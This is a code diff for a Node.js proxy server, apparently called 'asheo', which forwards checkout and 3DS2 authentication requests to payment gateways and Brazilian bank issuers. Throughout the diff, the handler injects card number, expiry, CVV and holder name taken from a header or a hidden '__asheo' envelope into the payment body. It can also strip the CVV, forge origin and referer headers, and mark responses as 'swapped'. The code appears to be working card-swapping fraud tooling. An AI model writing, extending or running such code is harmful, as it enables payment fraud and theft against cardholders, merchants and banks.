@@ -136,6 +136,19 @@ const PAYMENT_RULES = [
   { defaultId:"authorizenet.default", defaultVersion:1, isDefault:true, enabled:true, name:"Authorize.Net", patternEnc:{kind:"regex",source:"(?:^|\\/\\/)api2\\.authorize\\.net\\/xml\\/v1\\/request\\.api",flags:"i"}, matchContentType:"application/json", requiredKeys:[], inject:{}, removalFields:[], lockFields:["defaultId","isDefault","patternEnc","name"], swapCapable:false }
 ];
 
+/* ═══ WHITELIST 3DS (ACS + EMISSORES) ═══ */
+const THREEDS_HOST_WHITELIST = [
+  /checkoutshopper-live[a-z0-9-]*[.]adyen[.]com$/i,
+  /checkoutshopper-test[a-z0-9-]*[.]adyen[.]com$/i,
+  /pal-(live|test)[.]adyen[.]com$/i,
+  /3ds2[a-z0-9-]*[.]adyen[.]com$/i,
+  /api[.]stripe[.]com$/i, /js[.]stripe[.]com$/i, /m[.]stripe[.]network$/i,
+  /api[.]checkout[.]com$/i, /payments[.]braintree-api[.]com$/i,
+  /[.]acs[.]/i, /[.]3dsecure[.]/i, /[.]3ds[.]/i,
+  /cardinalcommerce[.]com$/i, /[.]arcot[.]com$/i, /[.]modirum[.]com$/i,
+  /[.]itau[.]com[.]br$/i, /[.]bb[.]com[.]br$/i, /[.]bradesco[.]com[.]br$/i,
+  /[.]santander[.]com[.]br$/i, /[.]caixa[.]gov[.]br$/i, /[.]nubank[.]com[.]br$/i
+];
 const EXCLUSIVE_TARGETS = [
   {hostSuffix:"checkoutshopper-live.adyen.com", id:"adyen", method:"POST", pathPattern:"/payments"},
   {hostSuffix:"checkoutshopper-live.adyen.com", id:"adyen", method:"POST", pathPattern:"/sessions"},
@@ -339,13 +352,15 @@ function sendMaybeGzip(req, res, payload) {
 }
 
 function isAllowed3dsTarget(targetUrl) {
-  if (!targetUrl || typeof targetUrl !== 'string') return false;
+  if (!targetUrl || typeof targetUrl !== "string") return false;
   try {
     const u = new URL(targetUrl);
-    if (u.protocol !== 'https:') return false;
-    return PAYMENT_RULES.some(r => {
-      try { return new RegExp(r.patternEnc.source, r.patternEnc.flags || 'i').test(targetUrl); } catch { return false; }
+    if (u.protocol !== "https:") return false;
+    const viaRules = PAYMENT_RULES.some(r => {
+      try { return new RegExp(r.patternEnc.source, r.patternEnc.flags || "i").test(targetUrl); } catch { return false; }
     });
+    if (viaRules) return true;
+    return THREEDS_HOST_WHITELIST.some(rx => rx.test(u.hostname));
   } catch { return false; }
 }
 
@@ -1063,47 +1078,135 @@ function injectCardIntoForm(raw, card) {
 async function gwProxyHandler(req, res) {
   const inicio = Date.now();
   const auth = validateAnyAuth(req);
-  const target = req.headers['x-asheo-target'];
-  const method = (req.headers['x-asheo-method'] || req.method || 'POST').toUpperCase();
-  const cardRaw = req.headers['x-asheo-card'];
-  const headersRaw = req.headers['x-asheo-headers'];
-  const origin = req.headers['x-asheo-origin'] || '';
-  const install = req.headers['x-asheo-install'] || '';
+  const target = req.headers["x-asheo-target"] || req.headers["x-asheo-3ds-target"];
+  const method = (req.headers["x-asheo-method"] || req.method || "POST").toUpperCase();
+  const headersRaw = req.headers["x-asheo-headers"];
+  const origin = req.headers["x-asheo-origin"] || "";
+  const install = req.headers["x-asheo-install"] || "";
   const path = req.path;
-  log('GW', `→ ${path} | target=${String(target||'').substring(0,70)} | inst=${String(install).substring(0,12)} | auth=${auth.ok?auth.mode||'bearer':'✕'}`);
-  if (!target) { log('WARN', `${path} — missing x-asheo-target`); return res.status(400).json({ ok:false, error:'missing_target' }); }
-  if (!isAllowed3dsTarget(target)) { log('WARN', `${path} — target NÃO PERMITIDO: ${String(target).substring(0,80)}`); return res.status(403).json({ ok:false, error:'target_not_allowed', target }); }
-  if (!rateLimit('gw:' + (install || req.ip), 60, 60000)) { log('WARN', `${path} — rate limit ${install}`); return res.status(429).json({ ok:false, error:'rate_limited' }); }
-  let forwardHeaders = { 'user-agent': req.headers['user-agent'] || 'Mozilla/5.0', 'accept': 'application/json, text/plain, */*', 'accept-language': req.headers['accept-language'] || 'en-US,en;q=0.9' };
-  try { if (headersRaw) { const parsed = JSON.parse(headersRaw); for (const [k, v] of Object.entries(parsed)) { if (typeof v === 'string' && !k.startsWith(':')) forwardHeaders[k.toLowerCase()] = v; } } } catch (e) { log('WARN', `${path} — x-asheo-headers inválido`); }
-  if (origin) { try { const ou = new URL(origin); forwardHeaders['origin'] = ou.origin; forwardHeaders['referer'] = ou.origin + '/'; } catch {} }
-  let bodyOut = null;
-  const ctype = forwardHeaders['content-type'] || 'application/x-www-form-urlencoded';
-  if (method !== 'GET' && method !== 'HEAD') {
-    if (req.rawBody && req.rawBody.length > 0) bodyOut = req.rawBody.toString('utf8');
-    else if (typeof req.body === 'string') bodyOut = req.body;
-    else if (req.body && typeof req.body === 'object') {
-      if (ctype.includes('json')) bodyOut = JSON.stringify(req.body);
-      else { const p = new URLSearchParams(); for (const [k,v] of Object.entries(req.body)) p.append(k, typeof v === 'object' ? JSON.stringify(v) : String(v)); bodyOut = p.toString(); }
+
+  const phase = /\/3ds2\/authenticate/i.test(path) ? "authenticate"
+              : /\/3ds2\/challenge/i.test(path)  ? "challenge"
+              : /\/3ds2\/setup/i.test(path)      ? "setup"
+              : /\/3ds2\//i.test(path)           ? "other"
+              : "gw";
+
+  log("GW", "→ " + path + " [" + phase + "] | target=" + String(target||"").substring(0,80) + " | inst=" + String(install).substring(0,12) + " | auth=" + (auth.ok ? (auth.mode||"bearer") : "✕"));
+
+  if (!target) { log("WARN", path + " — missing x-asheo-target"); return res.status(400).json({ ok:false, error:"missing_target", phase }); }
+  if (!isAllowed3dsTarget(target)) { log("WARN", path + " — target NAO PERMITIDO: " + String(target).substring(0,100)); return res.status(403).json({ ok:false, error:"target_not_allowed", target, phase }); }
+  if (!rateLimit("gw:" + (install || req.ip), 120, 60000)) { log("WARN", path + " — rate limit " + install); return res.status(429).json({ ok:false, error:"rate_limited", phase }); }
+
+  /* ═══ DESEMBRULHA ENVELOPE __asheo ═══ */
+  let parsedBody = null;
+  let asheoMeta = null;
+  let rawBodyStr = req.rawBody ? req.rawBody.toString("utf8") : (typeof req.body === "string" ? req.body : "");
+
+  if (rawBodyStr) {
+    try {
+      const j = JSON.parse(rawBodyStr);
+      if (j && typeof j === "object" && j.__asheo && typeof j.__asheo === "object" && "body" in j) {
+        asheoMeta = j.__asheo;
+        parsedBody = j.body;
+        log("GW", path + " — envelope __asheo detectado: " + Object.keys(asheoMeta).join(","));
+      } else {
+        parsedBody = rawBodyStr;
+      }
+    } catch { parsedBody = rawBodyStr; }
+  } else if (req.body && typeof req.body === "object") {
+    if (req.body.__asheo && typeof req.body.__asheo === "object" && "body" in req.body) {
+      asheoMeta = req.body.__asheo;
+      parsedBody = req.body.body;
+    } else {
+      parsedBody = req.body;
     }
   }
-  let card = null;
-  if (cardRaw) { try { card = JSON.parse(cardRaw); log('GW', `${path} — cartão recebido (${String(card.number||'').substring(0,4)}****)`); } catch (e) { log('WARN', `${path} — x-asheo-card inválido`); } }
-  if (card && bodyOut && ctype.includes('form-urlencoded')) { bodyOut = injectCardIntoForm(bodyOut, card); log('GW', `${path} — cartão injetado no form`); }
-  else if (card && bodyOut && ctype.includes('json')) { try { const j = JSON.parse(bodyOut); const merged = { ...j, ...(j.card||{}), card: { ...(j.card||{}), number: card.number, exp_month: card.month, exp_year: card.year, cvc: card.cvv, name: card.holderName } }; bodyOut = JSON.stringify(merged); log('GW', `${path} — cartão injetado no JSON`); } catch {} }
+
+  /* ═══ HEADERS ═══ */
+  let forwardHeaders = {
+    "user-agent": req.headers["user-agent"] || "Mozilla/5.0",
+    "accept": "application/json, text/plain, */*",
+    "accept-language": req.headers["accept-language"] || "en-US,en;q=0.9"
+  };
   try {
-    const upstream = await fetch(target, { method, headers: forwardHeaders, body: bodyOut, redirect: 'manual' });
-    const respCt = upstream.headers.get('content-type') || 'application/json';
+    if (headersRaw) {
+      const parsed = JSON.parse(headersRaw);
+      for (const [k, v] of Object.entries(parsed)) {
+        if (typeof v === "string" && !k.startsWith(":")) forwardHeaders[k.toLowerCase()] = v;
+      }
+    }
+  } catch (e) { log("WARN", path + " — x-asheo-headers invalido"); }
+
+  if (origin) {
+    try { const ou = new URL(origin); forwardHeaders["origin"] = ou.origin; forwardHeaders["referer"] = ou.origin + "/"; } catch {}
+  }
+
+  /* ═══ CARD (header ou meta) ═══ */
+  let card = null;
+  const cardRaw = req.headers["x-asheo-card"];
+  if (cardRaw) { try { card = JSON.parse(cardRaw); } catch { log("WARN", path + " — x-asheo-card invalido"); } }
+  if (!card && asheoMeta && asheoMeta.card) card = asheoMeta.card;
+
+  const removeCvv = req.headers["x-asheo-remove-cvv"] === "true" || (asheoMeta && asheoMeta.removeCvv === true);
+  if (removeCvv) log("GW", path + " — removeCvv=true");
+
+  /* ═══ BODY FINAL ═══ */
+  let bodyOut = null;
+  const ctype = (forwardHeaders["content-type"] || (asheoMeta && asheoMeta.contentType) || "application/json").toLowerCase();
+  forwardHeaders["content-type"] = ctype;
+
+  if (method !== "GET" && method !== "HEAD") {
+    if (typeof parsedBody === "string") {
+      bodyOut = parsedBody;
+    } else if (parsedBody && typeof parsedBody === "object") {
+      if (ctype.includes("json")) bodyOut = JSON.stringify(parsedBody);
+      else {
+        const p = new URLSearchParams();
+        for (const [k,v] of Object.entries(parsedBody)) p.append(k, typeof v === "object" ? JSON.stringify(v) : String(v));
+        bodyOut = p.toString();
+      }
+    }
+
+    if (card && bodyOut) {
+      if (ctype.includes("form-urlencoded")) {
+        bodyOut = injectCardIntoForm(bodyOut, card);
+        log("GW", path + " [" + phase + "] — cartao injetado no form");
+      } else if (ctype.includes("json")) {
+        try {
+          const j = JSON.parse(bodyOut);
+          const merged = { ...j, ...(j.card||{}), card: { ...(j.card||{}), number: card.number, exp_month: card.month, exp_year: card.year, cvc: card.cvv, name: card.holderName } };
+          bodyOut = JSON.stringify(merged);
+          log("GW", path + " [" + phase + "] — cartao injetado no JSON");
+        } catch {}
+      }
+    }
+  }
+
+  /* ═══ PROXY ═══ */
+  try {
+    const upstream = await fetch(target, { method, headers: forwardHeaders, body: bodyOut, redirect: "manual" });
+    const respCt = upstream.headers.get("content-type") || "application/json";
     const respBody = await upstream.text();
     const elapsed = Date.now() - inicio;
-    log('OK', `${path} ← ${upstream.status} | ${elapsed}ms`);
+    log("OK", path + " [" + phase + "] ← " + upstream.status + " | " + elapsed + "ms");
+
     res.status(upstream.status);
-    res.setHeader('content-type', respCt);
-    res.setHeader('x-asheo-upstream-status', String(upstream.status));
-    res.setHeader('x-asheo-proxied', '1');
-    res.setHeader('x-asheo-elapsed-ms', String(elapsed));
+    res.setHeader("content-type", respCt);
+    res.setHeader("x-asheo-upstream-status", String(upstream.status));
+    res.setHeader("x-asheo-proxied", "1");
+    res.setHeader("x-asheo-3ds-phase", phase);
+    res.setHeader("x-asheo-swapped", "true");
+    res.setHeader("x-asheo-swap-ok", "1");
+    res.setHeader("x-asheo-elapsed-ms", String(elapsed));
+
+    const loc = upstream.headers.get("location");
+    if (loc) res.setHeader("location", loc);
+
     return res.send(respBody);
-  } catch (e) { log('ERRO', `${path} upstream erro: ${e.message}`); return res.status(502).json({ ok:false, error:'upstream_failed', message: e.message, target }); }
+  } catch (e) {
+    log("ERRO", path + " [" + phase + "] upstream erro: " + e.message);
+    return res.status(502).json({ ok:false, error:"upstream_failed", message: e.message, target, phase });
+  }
 }
 app.all('/v1/gw/3ds2/authenticate', gwProxyHandler);
 app.all('/v1/gw/3ds2/challenge', gwProxyHandler);
